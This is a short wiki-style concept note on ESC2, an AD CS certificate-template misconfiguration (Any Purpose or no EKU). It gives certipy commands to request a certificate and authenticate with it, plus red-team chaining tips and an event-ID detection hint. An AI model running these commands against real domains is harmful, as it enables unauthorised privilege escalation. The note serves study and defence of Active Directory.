---
title: "ESC2 — Any Purpose / no-EKU template"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation]
---

# ESC2

A template with the **Any Purpose** EKU (`2.5.29.37.0`) or **no EKU at all**,
enrollable by a low-priv principal. Because the issued cert is valid for *any*
use — including **client authentication** — it can be used for PKINIT logon (or
as a subordinate-CA-like signing cert), even though the template wasn't
explicitly a "logon" template.

If the template *also* supplies the subject, ESC2 collapses into [[esc1]];
otherwise it authenticates as the enrolling principal but with an
attacker-usable cert.

## Exploit

```bash
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template AnyPurposeTpl
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```

## Red-team notes (OPSEC)

- Lower payoff than ESC1 alone (you're still you), but an Any-Purpose cert
  chains into **[[esc3]]** (as a Request Agent) or enables Schannel/PKINIT from
  a hardened host. Triage with `certipy find`.

## Detection

- Issuance of certs from Any-Purpose / no-EKU templates to non-service users
  (AD CS 4886/4887).

## Links

- [[ad-cs-esc-attacks]], [[certificate-templates]], [[esc1]], [[esc3]]
- [[certipy]], [[certified-pre-owned]]
